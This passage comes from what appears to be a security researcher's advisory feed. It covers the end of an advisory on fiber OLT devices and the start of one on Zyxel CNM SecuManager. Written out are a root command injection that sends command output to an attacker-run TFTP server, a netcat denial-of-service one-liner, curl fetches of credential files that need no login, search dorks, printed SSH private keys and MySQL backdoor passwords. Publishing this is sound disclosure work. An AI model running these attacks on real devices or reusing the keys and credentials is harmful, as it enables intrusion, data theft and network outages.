 swport               - enter switch port config mode
 system               - configure systerm
 trunk                - enter trunk config mode
 vlan                 - enter vlan config mode

--------------------------------------------------
  Global Command
--------------------------------------------------
 broadcast            - Write message to all users logged in
 clear                - Clear the screen
 debug                - debug
 history              - Show command history
 logout               - Log off this system
 ping                 - Ping a network hosts
 show                 - show system configuration
 tracert              - trace the route to host
 tree                 - Show command tree
 who                  - Display users currently logged in
epon#
</code></pre>
<p>With these access, an attacker can completely overwrite the configuration and overwrite the firmware.</p>
<p><a id="credentials-infoleak-telnet"></a></p>
<h2>Details - Credentials infoleak and credentials in clear-text (telnet)</h2>
<p>For this part, we suppose the attacker has a working CLI access (which can be achieved using <a href="#backdoor-telnet">Backdoor access with telnet</a>).</p>
<p>It is possible to extract administrator credentials by running this command in the CLI:</p>
<pre><code>epon# show system infor
Web Server
  Version          : V1.2.0
  BuildTime        : 19-04-23
  Administrator    : LOGIN_CLEAR_TEXT
  Password         : PASSWORD_CLEAR_TEXT
</code></pre>
<p><a id="command-injection-root"></a></p>
<h2>Details - Escape shell with root privileges</h2>
<p>For this part, we suppose the attacker has a working CLI access (which can be achieved using <a href="#backdoor-telnet">Backdoor access with telnet</a>).</p>
<p>There is a command injection in the CLI allowing an attacker to execute commands as root.</p>
<p>The command injection is located in the TFTP download configuration part.</p>
<p>In our case, we used metasploit to start a TFTP server on 192.168.1.101 and to receive results of injected commands into this TFTP server:</p>
<pre><code>$ msfconsole -q -x 'use auxiliary/server/tftp; run'
</code></pre>
<p>On the OLT:</p>
<pre><code>epon# system configurations download olt 192.168.1.101 "$(cat /proc/cpuinfo &gt; /tmp/test &amp;&amp; tftp 192.168.1.101 put /tmp/test test)"
Uncompress file failed!
</code></pre>
<p>On the TFTP server running on the attacker machine, we receive the output of the command <code>cat /proc/cpuinfo</code>:</p>
<pre><code>$ cat /tmp/test
system type             : Broadcom BCM956218
processor               : 0
cpu model               : Broadcom BCM3302 V5.0
BogoMIPS                : 299.00
wait instruction        : no
microsecond timers      : yes
tlb_entries             : 32
extra interrupt vector  : no
hardware watchpoint     : no
ASEs implemented        : mips16
VCED exceptions         : not available
VCEI exceptions         : not available
</code></pre>
<p>It is also possible to exfiltrate information using the embedded webserver:</p>
<p>On the OLT:</p>
<pre><code>epon# system configurations download olt 192.168.1.101 "$(export &gt; /opt/lighttpd/web/cgi/out.txt)"
</code></pre>
<p>On the attacker machine:</p>
<pre><code>$ curl http://ip/cgi/out.txt
export HOME='/broadcom/'
export OLDPWD='/'
export PATH='/sbin:/usr/sbin:/bin:/usr/bin'
export PWD='/broadcom'
export SHELL='/bin/sh'
export TERM='vt102'
export USER='root'
</code></pre>
<p>Futhermore, everything is running as <code>root</code> in the appliance:</p>
<pre><code>PID   USER     COMMAND
    1 0        init
    2 0        [ksoftirqd/0]
    3 0        [events/0]
    4 0        [khelper]
    5 0        [kthread]
    6 0        [kblockd/0]
    7 0        [sysled]
    8 0        [pdflush]
    9 0        [pdflush]
   10 0        [kswapd0]
   11 0        [aio/0]
   12 0        [mtdblockd]
   13 0        {rcS} /bin/sh /etc/rcS
   17 0        [jffs2_gcd_mtd5]
   23 0        [bkncmd]
   24 0        [bknevt]
   26 0        fd1008s.dat
   27 0        fd1008s.dat
   28 0        fd1008s.dat
   29 0        fd1008s.dat
   30 0        fd1008s.dat
   32 0        fd1008s.dat
   33 0        fd1008s.dat
   35 0        fd1008s.dat
   36 0        fd1008s.dat
   37 0        fd1008s.dat
   38 0        fd1008s.dat
   39 0        fd1008s.dat
   40 0        fd1008s.dat
   41 0        fd1008s.dat
   42 0        fd1008s.dat
   43 0        fd1008s.dat
   44 0        fd1008s.dat
   45 0        fd1008s.dat
   46 0        fd1008s.dat
   55 0        fd1008s.dat
   56 0        fd1008s.dat
   57 0        fd1008s.dat
   58 0        fd1008s.dat
   59 0        fd1008s.dat
   60 0        fd1008s.dat
   61 0        fd1008s.dat
   64 0        fd1008s.dat
   65 0        fd1008s.dat
   66 0        fd1008s.dat
   67 0        fd1008s.dat
   68 0        fd1008s.dat
   69 0        fd1008s.dat
   70 0        fd1008s.dat
   71 0        fd1008s.dat
   72 0        fd1008s.dat
  864 0        sh -c tftp 192.168.1.101 get $(ps a &gt; /tmp/test &amp;&amp; tftp 192.168.1.101 put /tmp/test test) /tmp/cfg_download.tar.gz
  865 0        sh -c tftp 192.168.1.101 get $(ps a &gt; /tmp/test &amp;&amp; tftp 192.168.1.101 put /tmp/test test) /tmp/cfg_download.tar.gz
  866 0        ps a
</code></pre>
<p><a id="pre-auth-remote-dos"></a></p>
<h2>Details - Pre-Auth Remote DoS</h2>
<p>A telnet server is running in the appliance and is reachable from the WAN interface and from the FTTH LAN interface (from the ONTs).</p>
<p>Using our cutting-edge fuzzing technology based on IA, machine-learning and shawarma, we are able to reboot any OLT from this vendor using this command:</p>
<pre><code>$ for i in $(seq 1 10); do cat /dev/urandom | nc 192.168.1.100 23 | hexdump -C;done
</code></pre>
<p>The device will reboot in the next 5 seconds and all the LEDs will blink like a Christmas tree!</p>
<p><a id="credentials-infoleak-web"></a></p>
<h2>Details - Credentials infoleak and credentials in clear-text (HTTP)</h2>
<p>A web server is running in the appliance and is reachable from the WAN interface and from the FTTH LAN interface (from the ONTs).</p>
<p>Without authentication, an attacker can extract web, telnet credentials and SNMP communities (read and write) by fetching these files:</p>
<pre><code>/opt/lighttpd/web/cgi/snmp_read.txt
/opt/lighttpd/web/cgi/snmp_write.txt
/opt/lighttpd/web/cgi/web_login.txt
/opt/lighttpd/web/cgi/web_passwd.txt
/opt/lighttpd/web/cgi/onu_name.txt
/opt/lighttpd/web/cgi/oem.txt
</code></pre>
<p>Using <code>curl</code>:</p>
<pre><code>$ curl http://ip/cgi/snmp_read.txt
$ curl http://ip/cgi/snmp_write.txt
$ curl http://ip/cgi/oem.txt
$ curl http://ip/cgi/onu_name.txt
$ curl http://ip/cgi/web_passwd.txt
$ curl http://ip/cgi/web_login.txt
</code></pre>
<p><a id="weak-encryption-algorithm"></a></p>
<h2>Details - Weak encryption algorithm</h2>
<p>A custom encryption algorithm is used to store encrypted passwords. This algorithm will XOR the password with the hardcoded value <code>*j7a(L#yZ98sSd5HfSgGjMj8;Ss;d)(*&amp;^#@$a2s0i3g</code> as shown below:</p>
<p><img alt="" src="images/2020-olt-FUN_007bcdc4.png" /></p>
<p><a id="insecure-management-interfaces"></a></p>
<h2>Details - Insecure management interfaces</h2>
<p>By default, the appliance can be managed remotely only with HTTP, telnet and SNMP. It doesn't support SSL/TLS for HTTP or SSH. An attacker can intercept passwords sent in clear-text and MITM the management of the appliance.</p>
<h2>Dorks</h2>
<p><code>EPON System</code></p>
<p><code>Optilink GEPON</code></p>
<h2>Vendor Response</h2>
<p>Full-disclosure is applied as we believe some backdoors are intentionally placed by the vendor.</p>
<h2>Report Timeline</h2>
<ul>
<li>Dec 27, 2019: Vulnerabilities found and this advisory was written.</li>
<li>Jul 07, 2020: A public advisory is sent to security mailing lists.</li>
<li>Jul 14, 2020: V-SOL removed.</li>
<li>Nov 24, 2020: MITRE provides CVE-2020-29054, CVE-2020-29055, CVE-2020-29056, CVE-2020-29057, CVE-2020-29058, CVE-2020-29059, CVE-2020-29060, CVE-2020-29061, CVE-2020-29062, CVE-2020-29063.</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>) and Alexandre Torres.</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/2020-cdata-0x00-olt.txt">https://pierrekim.github.io/advisories/2020-cdata-0x00-olt.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html">https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Multiple vulnerabilities found in Zyxel CNM SecuManager</title>
        <link href="2020-03-09-zyxel-secumanager-0day-vulnerabilities.html"/>
        <content type="html"><h2>Product Description</h2>
<p>The Zyxel Cloud CNM SecuManager is a comprehensive network management software that provides
an integrated console to monitor and manage security gateways including the ZyWALL USG and
VPN Series that can be extended in the future.</p>
<p>Zyxel CNM SecuManager 3.1.0/3.1.1 (Nov 14, 2018) is the latest version.</p>
<h2>Vulnerabilities Summary</h2>
<p>The summary of the vulnerabilities is:</p>
<ol>
<li><a href="#ssh-servers-keys">Hardcoded SSH server keys - CVE-2020-15312, CVE-2020-15313, CVE-2020-15314, CVE-2020-15315, CVE-2020-15316, CVE-2020-15317, CVE-2020-15318, CVE-2020-15319</a></li>
<li><a href="#mysql-backdoor-accounts">Backdoors accounts in MySQL - CVE-2020-15320, CVE-2020-15321, CVE-2020-15322</a></li>
<li><a href="#ejabberd-backdoors">Hardcoded certificate and backdoor access in Ejabberd - CVE-2020-15323, CVE-2020-15324, CVE-2020-15325, CVE-2020-15326</a></li>
<li><a href="#open-zodb">Open ZODB storage without authentication - CVE-2020-15327, CVE-2020-15328, CVE-2020-15329</a></li>
<li><a href="#myzyxel-hardcoded-secret">MyZyxel 'Cloud' Hardcoded Secret</a></li>
<li><a href="#hardcoded-secrets-apis">Hardcoded Secrets, APIs - CVE-2020-15330, CVE-2020-15331, CVE-2020-15332</a></li>
<li><a href="#predefined-pwd-admins">Predefined passwords for admin accounts - CVE-2020-15333</a></li>
<li><a href="#insecure-cloud">Insecure management over the 'Cloud'</a></li>
<li><a href="#xmpp-escape-seq-injection">xmppCnrSender.py log escape sequence injection - CVE-2020-15334</a></li>
<li><a href="#xmpp-no-auth-cleartext">xmppCnrSender.py no authentication and clear-text communication - CVE-2020-15335, CVE-2020-15336, CVE-2020-15337, CVE-2020-15338</a></li>
<li><a href="#zope-out-of-range">Incorrect HTTP requests cause out of range access in Zope</a></li>
<li><a href="#xss">XSS on the web interface - CVE-2020-15339</a></li>
<li><a href="#private-ssh-key">Private SSH key - CVE-2020-15340</a></li>
<li><a href="#backdoor-apis">Backdoor APIs - CVE-2020-15341, CVE-2020-15342, CVE-2020-15343, CVE-2020-15344, CVE-2020-15345, CVE-2020-15346</a></li>
<li><a href="#backdoor-management-rce">Backdoor management access and RCE - CVE-2020-15347</a></li>
<li><a href="#pre-auth-rce">Pre-auth RCE with chrooted access - CVE-2020-15348</a></li>
</ol>
<p>Technical Note:</p>
<p>The attack surface is very large and many different stacks are being used making it very interesting.
Furthermore, some daemons are running as root and are reachable from the WAN. Also, there is no
firewall by default.</p>
<p><a id="ssh-servers-keys"></a></p>
<h2>Details - Hardcoded SSH server keys</h2>
<p>By default, the appliance uses hardcoded SSH server keys for the main host and
for the chroot environments as shown below. This allows an attacker to MITM and
decrypt the encrypted traffic:</p>
<pre><code>root@chopin:/etc/ssh# ls -la /etc/ssh/
total 176
drwxr-xr-x  2 root root   4096 Mar  6  2018 .
drwxr-xr-x 77 root root   4096 Dec 20  2019 ..
-rw-r--r--  1 root root 136156 Jan 26  2018 moduli
-rw-r--r--  1 root root   1669 Jan 26  2018 ssh_config
-rw-r--r--  1 root root   2522 Mar  6  2018 sshd_config
-rw-------  1 root root    668 Mar  6  2018 ssh_host_dsa_key
-rw-r--r--  1 root root    601 Mar  6  2018 ssh_host_dsa_key.pub
-rw-------  1 root root    227 Mar  6  2018 ssh_host_ecdsa_key
-rw-r--r--  1 root root    173 Mar  6  2018 ssh_host_ecdsa_key.pub
-rw-------  1 root root   1675 Mar  6  2018 ssh_host_rsa_key
-rw-r--r--  1 root root    393 Mar  6  2018 ssh_host_rsa_key.pub
root@chopin:/etc/ssh# for i in *pub; do ssh-keygen -lf $i ; done
1024 80:24:2d:f6:66:d4:db:93:10:bd:0b:ef:bf:78:33:12  root@chopin (DSA)
256 04:e0:44:00:20:8a:9f:df:b9:01:4a:ba:b0:55:d6:57  root@chopin (ECDSA)
2048 56:ad:2f:a7:79:83:5b:64:32:d4:05:ce:7a:de:8f:44  root@chopin (RSA)
root@chopin:/etc/ssh# cat ssh_host_dsa_key
-----BEGIN DSA PRIVATE KEY-----
MIIBuwIBAAKBgQCdYajCHQF9wLkG+i88infBPbLkhE3cTTRHCbE5/vQ7/SdSdGH7
WlNJh9EkTdz17XDJW53y5IRz8SSxC0M3BXszcGQcHqqTtWVIpv08D5WztWYgQctA
RJDcu1rYZvtPq1qHN6Xo5zbPjvp0JnIT1/SoN1/jB8qIROFNuQPAeBMfiQIVAIqq
ufhcUfFSN4QJmMIgtpB6sCwnAoGBAIokbAVvxkQJX4yUxwBx0xyHydPLVkNggYkU
zfWYGxat4acsIwCAHy50k+oUnFxbVy9kp5YpGjp6uEWLegBIGQNBDxKmORp6Zvq7
MrWMaAL5VK0aJt4DiKQgGz4y2csCwRj6ioifxwBZLXJ+AKv4g7pRwyTDMVl6Gcy/
McgvCePGAoGAGb3elvsIcuDlbiQ3aCohhOpxLcMhgLblRde+eRJJywvKrat4njJd
2jAdVvUA6N76sPaxEPl8oQJiZlA76Qp8G6PMYsjJGsD8olGdjOpMNcDLI9wLgAKS
66DrS4w05RtHV43mb8NAVqC+wxlgwtbY3/A+X0faEOuOkPf3o0UVCi0CFGj4gg+A
+eDbJtE7Lq5vw8qBFHcq
-----END DSA PRIVATE KEY-----
root@chopin:/etc/ssh# cat ssh_host_ecdsa_key
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEII/rgKz6KXFYu9gjlaasMA7F4fA5bvy5nYFL+GSDVClSoAoGCCqGSM49
AwEHoUQDQgAETS0b/mPZ+x/F5NtfKGOkuMvx3AZL6MW9LkV64igIFgb0kUvoGjXx
f0iXR5Rgtgec6fatdKGYPsRTz3eBzKSNzA==
-----END EC PRIVATE KEY-----
root@chopin:/etc/ssh# cat ssh_host_rsa_key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3+4JXEBUNFcdux2oS7s2okKtk2UARJurWGs/nYVs+8vFRBVU
2lQqTTZkRTAAOPsDByo77BELr/DcYqtMPXBh3FLftrt5Su9pI04caPbL8BoeoOfq
LUY4nvZfTq/qmClxtp/Azg4Z495vTbMT34llTKcyGIyN7AglESiQ2iKU9BvRAwuN
xxIDBBmGGNSkyWC+T1ZiiuK8cfN5MgVpDyO6HcgJuaKgH8jjcbCUUizmUKJ7495i
itXll2uD6/WNHl8gikRNQBg+3Qpb+BEeTkWzaC+XgLADz+w5GQxreXW4T2yh5vtU
ph9ZT4j8EdEVig72rw6KlGguu6R97UylPHrFMwIDAQABAoIBAADyS53VM8Xo3FpP
HMf9KZTz/THTSnX/xnCgO2uaBcTmrpXEFVC67FbZNQFJ26ZiAThFiG1OASOkO/o6
yR61W+SHgSSPlEqpymL40IvtBx2jrp91e3rnghPB7NMzUSWFf1KLSFBWpOtepE/K
wvm95ey2BDMwXOUzf5yb9EjHvqNtfKVgAqBIM3wdGQ5cN3odYC9hBPVh9SM11IQM
P0fkOPqgMgQWoX7qOGhfx0lGBidq4XATkBikF8saY19Qc9td379UXyXT2rzHV1zq
epD9jbzu41DJ6btZReGU+ZzeFl8JFhxjlKaIObglrRxlKuYA1IE0+B5DgL1CBKcD
ahQVELECgYEA9WW7jDkgy1MTtO9tBM1yuxW7LBwvUkWJQ334IbTcmr2fmBMOZZYl
4gpxblWDCGJ8tkO1AvLopxputuFE1kBHgeXip0UlhYopK5lybXnMyVgHEipNzhsw
0qvgCzk+Cc8FUDsHtm1BJkuZREce50mcbEnTLmtbaod8MNT3AfnGHCsCgYEA6Zrb
jq9faU6FMrPH5BFSeNLVH+FgrmiEVxY8G8mjqThBumY2WIgM/Sg612IJllwYCvq7
PEkyKCBmpKcKM8zICLxM4AUctuPnhwFsVsAHfXu1sRK059US/EdqHdrVf0Eiyzmj
LV3zOSPq28TkvVfNkNSe3y4FXsOhc+G+6QoyjxkCgYEAr4MAfY0KeIHFsX4g0fOD
IG2tfiH2cnhLcVsyUiFCOuZus9zFSkD2fVIMyOYeHqwaGF4ao65KWeHc164MhtRY
kH5z+kDJUlZ7lbRdFBGuNz9fZ02cclIePD8zsbNSPL+1RCnEHWTM2O/vAdeAMdoD
J6wxf5zHOE0ItQBMXjxfxhsCgYAWd4VMOMOlXh7jXHUKEzxqUGSc91EUFQs9UO8h
AQiTesyff7sUUqllI5xdIJmpc1wAmlKtnqCLSWp1xXbuunA2nt2J4hP75vlae6GO
ylMuF1rHF/R8I3r69mdXTbeg0IPnJbjy4QlGYpTw5APXzf0AQ+Kvtj5f+dKqUXjJ
8ugf6QKBgDXRRHhFlFlJcDmMV+USaPfF5dcOpEX1PTxeHIPaFjUGBuq4kcT3NUPa
QJLAS+rg1PMrX6ggStNOSMG2kh7kne2Y38oE0zg9mKnRpP56e9DX/cWF/r1pMSvE
ceH7BAFV9daHQUoz4ljrsJQnvgVT4DTANpw8zB/7bTwBnD519AZB
-----END RSA PRIVATE KEY-----
root@chopin:/etc/ssh#
</code></pre>
<p>Same problem inside the "Axess" chroot:</p>
<pre><code>root@chopin:/opt/axess/etc/ssh# ls -la
total 176
drwxr-xr-x  2 root root   4096 Mar  6  2018 .
drwxr-xr-x 81 root root   4096 Mar  6  2018 ..
-rw-r--r--  1 root root 136156 Mar  6  2018 moduli
-rw-r--r--  1 root root   1669 Mar  6  2018 ssh_config
-rw-r--r--  1 root root   2489 Mar  6  2018 sshd_config
-rw-r--r--  1 root root    668 Mar  6  2018 ssh_host_dsa_key
-rw-r--r--  1 root root    601 Mar  6  2018 ssh_host_dsa_key.pub
-rw-r--r--  1 root root    227 Mar  6  2018 ssh_host_ecdsa_key
-rw-r--r--  1 root root    173 Mar  6  2018 ssh_host_ecdsa_key.pub
-rw-r--r--  1 root root   1679 Mar  6  2018 ssh_host_rsa_key
-rw-r--r--  1 root root    393 Mar  6  2018 ssh_host_rsa_key.pub
root@chopin:/opt/axess/etc/ssh# for i in *pub; do ssh-keygen -lf $i ; done
1024 49:73:d6:b0:8e:c0:de:d5:a4:5d:32:0a:2d:83:d9:2f  root@chopin (DSA)
256 53:fa:90:76:ed:9d:bc:28:8c:f4:4c:5e:88:29:f6:85  root@chopin (ECDSA)
2048 a2:59:77:cf:8c:0b:55:c3:53:a6:3a:fd:ac:d7:70:35  root@chopin (RSA)
root@chopin:/opt/axess/etc/ssh# cat ssh_host_dsa_key
-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQDLSttOJ+6RcDH+Lavzzo3+vXNeQiWCyE5XsaxUc++QugyxILRA
kWskEqtq+E1ZkX5H52lzguxsVVzWSvdII8yDJoHO26X51o/hLeT20LPokOWQgnoT
eziWd3wEYBYIyko6cBNnQICKFY4JUgo5xVfV4kVFjdqKYM6p5BFyBHSddQIVAOw/
SpLXgrkXAcQ7nUXdhQcAjbT/AoGAMuwFJlCkAV9GSRfElQZkljMG7/P2svnoN9H1
XgZ6mCuIQ/8HNcTgkXAuDZ64RL/QGK+ClhGd0xFrsw9+gWtL1L0ZuwoGcNj2iaZO
h49SoS6IJ+sFb6cHApXrgBgZv0O4FbpL8o5Tl6U2L0i3mlCXMGUSFAzpFTjwxcYG
fDnzrKoCgYBNcFwsJtr5ElvfUHwKoyXZ0xT3PswzL4VCSD9SAASI8VhT2LdYTk7Z
/0q4E9rUPZP4BNehb9juxGNqjW0wcXNnr0VDuN0vz2Vv+nKG6u8KIc1RbKs8J9H5
zzHRidPZLVdU0vVRrM/1kVvIFlZpnl9Ybuz2Ra5ZHPFhJ4SoqbHFRgIUBX+oAX4Z
ffkRUot9igOsNx6txoU=
-----END DSA PRIVATE KEY-----
root@chopin:/opt/axess/etc/ssh# cat ssh_host_ecdsa_key
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIGYB3fxcDt1ket4FRhbFKtqHcQ4K8HPnkAgmvP6hj8InoAoGCCqGSM49
AwEHoUQDQgAE116tsZ+HvPjDY4VvgN76fP/XF6DMUd75vY5DqVR2Av68KSUh5Ns9
yhOyfcNB89XBABE2VpM4h0yljhqwFASQCQ==
-----END EC PRIVATE KEY-----
root@chopin:/opt/axess/etc/ssh# cat ssh_host_rsa_key
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyaNk4eTtEKfkcpTQaxB/LL2A/XQhljt1UF22yJUYXh0VJCCJ
SNn36QbNOeI9qsaohlFobaM1ithKyp6rQbZzzw/Jg7W76hA1NLSqbNS7mgg6bD1X
5/M81OJjjQ9iXUXx7/XrT/Of34QMvOjfKsOmtMsUYbk9Qf9G0so58yYGlNMSKNZb
6O4flsztM1LIPYXLZV4uQrV9BjUhSpumvYGc93fw88V5fYEYfGcF0pUVEfBvgGvZ
50558GR+A1LF6IdVbmViAZ6HgxiMaM85F2h7QBbt3SrNOfTO481EBD4j7ipnBpJM
KuRPQQH7KxKEzi8VaE4qVU0eZcIGeMeRr0prnwIDAQABAoIBAAohsKb9FsBYf00W
lyZaDNnVp86UcD+ZOzrPiqinfTL1aSOIkv1bHm7SDavT519WXg9ptcKUidMxLQjj
Uh2aKlWEKI76qbeIGvRMA6g2RDroIO9hYbJg8XSM742d8UZYhmCVTb6VsjnL68vu
M5B1hkHdVmfWo/JV/lwHF0RVa808eulp96xjvHEoHziVFKCXEsS1UDl6h2/+oI1n
5oIPGn7JTU1zGkpf53oDZla0GiO76JtYadGn4NU7g6Y1O3xweqgzKDJlIJhC5rL7
8Rn9Tef1YmjCL+Nhz6fMqkeFMWkaY8HvONyVsulv4qJoCKYKdXzp/vdf+rkKApuq
mTNxSkkCgYEA95y6gCSo1d/plJijGJdD1NT/BS/yMbq78VaIwx/8hHEkKXVedfdk
hEvh8eBxjnkogR3fgPEQSfyu2N4CEYVTdJS72+4hgNRgMDW8ToawqkHnuBfH2+Wp
kFqiw9rPsE5I/MsngSXOVBPipQWk+5HKNlN8AcD7stefuHjmTPrAJfUCgYEA0Hf7
vqn2ZO6Vk3oW6NB+fshWsSK4BzskkB21I/zcMzLFla5qJMKAQQNwmtFgLPl8kvEz
ZkAK1yneKDz1JmF+vC594WDkk9RO3oB0KcYYJSplccaVgGfUiAfvpRMBYwrx6CWS
2GgBkxIpg9XE/XPQlDAl5P5wMqXJtS/AjMSEOsMCgYEAtf0Tdit7i/ZOj1DATsqe
qEcESKO8tqAwkmivi/pudklR8sa47qstza6YGlaEH9sc0glKxFJpTnfRasOBca80
b3MBv9t99FojeEuGY5DLN9fIn52a3xwlTFvRVXH1Q/fF3UbTejB3PYSACBnl8KBu
pw8lDYTxebjRQ5xYaCvEHiECgYEAmInSyRZwVjZFeF3zeXNlu7s3w/FVmuTpwhIa
wzR4o3XZIcc3n6I6Wlf8AyyFJSOAxbx8Eat2wy29gs/nyae5JlUWgt11I75L3386
gH6UmE1HYVMffY978fVsousfLquJioZDxtmDnWvCuNaoh5RA4M3CTKbozgaFa3B/
ggEhiCUCgYEAhcuDPqDYZpDW5pvgLSfb8WmfxMKZqMffrIdjBhMjWSqlY5+M8EHC
7ufXlwa2v2bNmBZCtHYWSAM06lBhEwxW/cDo29V9ncA0kCiwYVKYuof27ziExp1A
530+t7PjU4CKCaNzVcuW9ivQ0HkBnMNAqHGR0lOSBk4Qfizfz2wzLD8=
-----END RSA PRIVATE KEY-----
root@chopin:/opt/axess/etc/ssh#
</code></pre>
<p>It should be noted the private keys are using wrong permissions and are world-readable (644).</p>
<p>Same problem again in the "mysql" chroot:</p>
<pre><code>root@chopin:/opt/mysql/etc/ssh# ls -la
total 156
drwxr-xr-x  2 root root   4096 Mar 18  2015 .
drwxr-xr-x 66 root root   4096 Mar  6  2018 ..
-rw-r--r--  1 root root 125749 Apr  3  2014 moduli
-rw-r--r--  1 root root   1669 Apr  3  2014 ssh_config
-rw-r--r--  1 root root   2453 Mar 18  2015 sshd_config
-rw-------  1 root root    668 Mar 18  2015 ssh_host_dsa_key
-rw-r--r--  1 root root    601 Mar 18  2015 ssh_host_dsa_key.pub
-rw-------  1 root root   1679 Mar 18  2015 ssh_host_rsa_key
-rw-r--r--  1 root root    393 Mar 18  2015 ssh_host_rsa_key.pub
root@chopin:/opt/mysql/etc/ssh# for i in *pub; do ssh-keygen -lf $i ; done
1024 3e:46:e9:be:c0:8c:ba:dc:46:3a:3f:22:4f:77:0b:ae  root@chopin (DSA)
2048 da:b5:27:e4:80:da:4e:18:cf:b9:52:49:2c:72:e2:ce  root@chopin (RSA)
root@chopin:/opt/mysql/etc/ssh# cat ssh_host_dsa_key
-----BEGIN DSA PRIVATE KEY-----
MIIBuwIBAAKBgQDWqnzU+ljijXqKw5vEG+p6euc73+CrIDP+JAqvD6udBLe8ojDi
8l3N8l4BxXKcTwGAEeHQMMtPthNvPrO4IMVdf9Z/3mhRhX9x7NB/Fm7JrCjDwY4c
x8R+inJk9y86ow7fUodKfN9nt5Zh6FsfPs/0vq4Mg2MLjUkiau3UQy7mhQIVAOCr
fau8ONhgh8vCPvw8mIVIJnmbAoGAEqWt4/b1D7Fevf3b2afmMt02zUDNIvlxJjhL
EcG4Q6FxT0WwKIdBGDeOaB7gGR7acWvfr5yrMhQLgvAWMhdlkG0UY4Q/2Kh0PR1p
D4ZMssaxHnt/EprT+GxZfy4e9MhK3RwdeYCSwfvbcIKznFbHv+AUDZ6j/KRpU1e/
Pi//Yl8CgYBCt5jPU0bIymiXaX3FnDNBoydI9lmU0z8qVDDp49vZdOJnemtzU7d5
4k8UGOoBSZ12PC+W0ZNJNH5jWA2DV5+Pajq+UsYW6JHog8PMHmdLDo6+yF96avsE
8bGrSWqSV0NZ8g7NVRasuajJVZHoe1gpENTvd+LxbKHiv7f4bvqGQwIVAMS7rCpe
UyV29YpCEwVrL5CXEAeW
-----END DSA PRIVATE KEY-----
root@chopin:/opt/mysql/etc/ssh# cat ssh_host_rsa_key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAvnS8NXGuXVlFTmotghmZgNE3weboUbqiUjznYqZlaIbvhvS5
GYlVZMYgtEj4y2+perz9wuvdv8/M+it3cc4XfQdpASY1niL/P5M304tD+9ah/z3A
VD1OxDRevC7LQlkXOFJrlQ5RRTR1cmChsLWi9zEFbDSzJy9anZk+U/uQSQZsy71O
0ZntWSkjnH79+OA6GqKJ5S9PNhqaFWmB76kBbf21iWki2acIErhGg9ThnmR0vFRy
/QqeH8P83RDXYzd0nkLgxjL3GNI+Y/Dw+h6ks0zNoGIGfE1QsFc3gtkv8B28uomV
fTo5xLS+/UKKmZnCq0UPC3cElskhAtYMYfZgkQIDAQABAoIBADnl3O1WUM55+/K5
nnoFdD/P2mZs3sUxunTLpP+9W+ip1JkvPjIAKOCIxppn8JJPsLLqTy55a6EK9+I5
YodLQqK0pPw/dF9NflECXR9HH/SoK/ke+Z/iP1awIPiONSZHVSK/E4ttndEvAGEz
9RN2NEN3OJHLd4b7A04Trvny6Mr5zYe6bXgLK7DZRzE+dAUVIP4XVltdFh26KlhG
UvO2ihU+Tuz9AxhP3+UIgndMMsFhxk52ItBobCSts5WzPrzZs+QWXmoS6gcWnYU7
3LohV9Kn8lpDiu/lB7dQz/awyWaEKOf1U+p473qmH53+HahT50Apj27djtF4lvEx
Lfv8ct0CgYEA6wMyHEzVh0OLJNJ2J3RgebsfukTigM8QQqMKWqUep55/66W/85QL
mejFd2ipOJZF/VV/fqw+ocK8Z9ztlW2S0O3JRC29Gs7icwvUnErr0g7k5Xs3m61N
pteRH1ATxW+bX12I9BWpQv6jMZcR1xXNz4yn0XSumZz/vZ7ABxntR6sCgYEAz3bm
FECHPRtzg68/eHPbZ+A+3sD7vuH7AuD1X6yWozWgdE7aGf0wG+CFerNQBgqkv1R6
JMOT/lqQg/T8j/EWuGfIQcHHso2/ePSPl08YsAaXdmy2f+OSNC4CqdCeBLRgFvjt
gxhge8iunu/tWUsB9iAiBPS2bsQVX+ymDE7TzLMCgYEAi39BHmVJFdo03K2EbtT4
cylsos9Ct3yxRSyr97QtZweBHOos7zOAU2JE3CUm1Sz17HL0k8dAAhqqZOhRqjH5
RMTwg+S2bBRDfFCYahFauzwWCFVEY8bR4efw/2oz4izmSAwoP+Ifr2Ggks3+S/Jo
UPtHnd+pyArWDsMNbumn27MCgYApOpe+rpQxsKLkKI+UgHG50varje55oK8hg1NA
ECxfgujANGtjfs1wvM3J9JiSmsriuwcLB1MB2T2e+7C1alP5kaZaawgkk8bZYsCm
cTGWybiP8ErUX4VOmVYuKSc+CBqQdie9Rbrm3prVOxkQBbf+EaSxF3Cp0o3s4jqd
d4zfwQKBgQDeZmWqkMX/vmwV4GzgV2FRNcVry5nNWlt6wroF7DEuA7WGAZVRSBx0
nPzDkq3jorJEzXBmIwMNy3IN5NIdin/GSxbMMwx7JvKaPVKw5GubmICO/T9hVurJ
2RnfOAuZaMQ1bZSD49jEV30cxBM/gPORyyAHGrlyG2kHoXan5aDcHQ==
-----END RSA PRIVATE KEY-----
root@chopin:/opt/mysql/etc/ssh#
</code></pre>
<p>Hopefully, the root account has been disabled in the /etc/shadow file
(<code>1234</code> is the password if the account is re-enabled).</p>
<p>The management access using the <code>secu_manager</code> user is still vulnerable to MITM/decryption.</p>
<p><a id="mysql-backdoor-accounts"></a></p>
<h2>Details - Backdoors accounts in MySQL</h2>
<p>MySQL is pre-configured with several static accounts. It only listens to the loopback interface.</p>
<p>Credentials:</p>
<ul>
<li>root / axiros</li>
<li>root / axiros from 61.222.86.79 / zyadb79.zyxel.com.tw (HINET-NET, Taiwan)</li>
<li>root / axiros from 118.163.48.108 / 118-163-48-108.HINET-IP.hinet.net (HINET-NET, Taiwan)</li>
<li>root / axiros from localhost</li>
